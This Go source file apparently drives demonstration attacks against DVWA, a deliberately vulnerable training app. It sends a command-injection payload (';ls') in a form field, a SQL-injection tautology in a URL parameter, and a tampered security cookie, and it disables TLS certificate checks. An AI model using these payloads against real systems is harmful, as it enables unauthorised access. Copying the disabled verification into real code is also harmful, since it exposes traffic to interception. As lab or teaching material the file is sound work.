package main

import (
	"crypto/tls"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"

	"github.com/labstack/echo/v4"
)

///////////////////////////////////////////////////////////////////////////////////
// COMMAND INJECTION                                                             //
///////////////////////////////////////////////////////////////////////////////////

func handleCommandInjectionAction(c echo.Context) error {
	username := c.FormValue("username")
	password, ok := UserPassMap[username]

	if !ok {
		log.Println("Invalid username") // Log the error
		return c.String(http.StatusBadRequest, "Invalid username")
	}

	jar, err := cookiejar.New(nil)
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := &http.Client{
		Transport: transport,
		Jar:       jar,
	}

	// Perform Authentication
	data := url.Values{
		"username": {username},
		"password": {password},
		"Login":    {"Login"},
	}

	req, err := http.NewRequest("POST", DVWA_URL+"/login.php", strings.NewReader(data.Encode()))
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	req.Header.Set("authority", DVWA_HOST)
	req.Header.Set("origin", DVWA_URL)
	req.Header.Set("referer", DVWA_URL+"/")
	req.Header.Set("user-agent", USER_AGENT)
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err := client.Do(req)
	if err != nil {
		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("Received HTTP response code %d while trying to log in", resp.StatusCode)
		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
	}

	// Execute Command Injection
	data = url.Values{
		"ip":     {";ls"},
		"Submit": {"Submit"},
	}
	req, err = http.NewRequest("POST", DVWA_URL+"/vulnerabilities/exec/", strings.NewReader(data.Encode()))
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	req.Header.Set("authority", DVWA_HOST)
	req.Header.Set("origin", DVWA_URL)
	req.Header.Set("referer", DVWA_URL+"/index.php")
	req.Header.Set("user-agent", USER_AGENT)
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err = client.Do(req)
	if err != nil {
		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
	}

	defer resp.Body.Close()

	output, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	// Return the HTML content
	return c.HTML(http.StatusOK, string(output))
}

///////////////////////////////////////////////////////////////////////////////////
// SQL INJECTION                                                                 //
///////////////////////////////////////////////////////////////////////////////////

func handleSQLInjectionAction(c echo.Context) error {
	username := c.FormValue("username")
	password, ok := UserPassMap[username]

	if !ok {
		return c.String(http.StatusBadRequest, "Invalid username")
	}

	jar, err := cookiejar.New(nil)
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := &http.Client{
		Transport: transport,
		Jar:       jar,
	}

	// Perform Authentication
	data := url.Values{
		"username": {username},
		"password": {password},
		"Login":    {"Login"},
	}

	req, err := http.NewRequest("POST", DVWA_URL+"/login.php", strings.NewReader(data.Encode()))
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	// Set Headers for the request
	req.Header.Set("authority", DVWA_HOST)
	req.Header.Set("origin", DVWA_URL)
	req.Header.Set("referer", DVWA_URL+"/")
	req.Header.Set("user-agent", USER_AGENT)
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err := client.Do(req)
	if err != nil {
		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
	}

	defer resp.Body.Close()

	// Execute SQL Injection
	req, err = http.NewRequest("GET", DVWA_URL+"/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit", nil)
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	// Set Headers for the request
	req.Header.Set("authority", DVWA_HOST)
	req.Header.Set("origin", DVWA_URL)
	req.Header.Set("referer", DVWA_URL+"/index.php")
	req.Header.Set("user-agent", USER_AGENT)
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err = client.Do(req)
	if err != nil {
		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
	}

	defer resp.Body.Close()

	output, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	// Return the HTML content
	return c.HTML(http.StatusOK, string(output))
}

///////////////////////////////////////////////////////////////////////////////////
// COOKIE SECURITY                                                               //
///////////////////////////////////////////////////////////////////////////////////

type CookieActionResponse struct {
	InitialCookie  string `json:"initialCookie"`
	ModifiedCookie string `json:"modifiedCookie"`
	WebPageHTML    string `json:"webPageHTML"`
}

func handleCookieSecurityAction(c echo.Context) error {
	username := c.FormValue("username")
	password, ok := UserPassMap[username]

	if !ok {
		log.Println("Invalid username") // Log the error
		return c.String(http.StatusBadRequest, "Invalid username")
	}

	jar, err := cookiejar.New(nil)
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := &http.Client{
		Transport: transport,
		Jar:       jar,
	}

	// Perform Authentication
	data := url.Values{
		"username": {username},
		"password": {password},
		"Login":    {"Login"},
	}

	req, err := http.NewRequest("POST", DVWA_URL+"/login.php", strings.NewReader(data.Encode()))
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	req.Header.Set("authority", DVWA_HOST)
	req.Header.Set("origin", DVWA_URL)
	req.Header.Set("referer", DVWA_URL+"/")
	req.Header.Set("user-agent", USER_AGENT)
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err := client.Do(req)
	if err != nil {
		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("Received HTTP response code %d while trying to log in", resp.StatusCode)
		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
	}

	// Get the initial cookie string
	initialCookieText := ""
	for _, cookie := range jar.Cookies(req.URL) {
		initialCookieText += cookie.String() + "<br>"
	}

	// Now, manipulate the cookie and create a new CookieJar
	newJar, err := cookiejar.New(nil)
	if err != nil {
		return c.String(http.StatusInternalServerError, err.Error())
	}

	var cookies []*http.Cookie
	for _, cookie := range jar.Cookies(req.URL) {
		if cookie.Name == "security" {
			cookies = append(cookies, &http.Cookie{Name: cookie.Name, Value: "medium"})
			log.Printf("Changing cookie %s to medium", cookie.Name)
		} else {
			cookies = append(cookies, cookie)
		}
	}

	newJar.SetCookies(req.URL, cookies)

	// Get the modified cookie string
	modifiedCookieText := ""
	for _, cookie := range newJar.Cookies(req.URL) {
		modifiedCookieText += cookie.String() + "<br>"
	}

	log.Println("Modified cookies: ", modifiedCookieText)

	// Make a new request with the manipulated cookie
	client = &http.Client{
		Transport: transport,
		Jar:       newJar,
	}

	req, _ = http.NewRequest("GET", DVWA_URL+"/security.php", nil)

	// Setting the headers
	req.Header.Set("authority", DVWA_HOST)
	req.Header.Set("origin", DVWA_URL)
	req.Header.Set("referer", DVWA_URL+"/")
	req.Header.Set("user-agent", USER_AGENT)
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	log.Println("Sending request to /security.php with manipulated cookies")

	resp, _ = client.Do(req)
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	log.Println("Received response from /security.php")

	return c.JSON(http.StatusOK, &CookieActionResponse{
		InitialCookie:  initialCookieText,
		ModifiedCookie: modifiedCookieText,
		WebPageHTML:    string(body),
	})
}
